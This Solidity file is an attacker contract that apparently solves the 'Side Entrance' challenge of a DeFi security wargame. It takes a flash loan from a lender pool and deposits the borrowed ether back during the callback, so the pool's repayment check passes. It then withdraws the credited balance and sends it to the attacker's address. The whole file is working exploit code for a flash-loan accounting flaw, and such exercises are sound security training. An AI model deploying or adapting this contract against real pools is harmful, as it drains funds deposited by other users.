// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SideEntranceAttacker
 * @author Yasaman (Jasmine) Abtahi
 */

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    
    using SafeMath for uint256;
    using Address for address payable;

    SideEntranceLenderPool pool;
    uint256 amount;
    address payable attacker;

    constructor(address _SideEntranceLenderPool, uint256 _amount, address _attacker) {
        pool = SideEntranceLenderPool(_SideEntranceLenderPool);
        amount = _amount;
        attacker = payable(_attacker);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() public {
        pool.flashLoan(amount);
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    receive() external payable {}
}
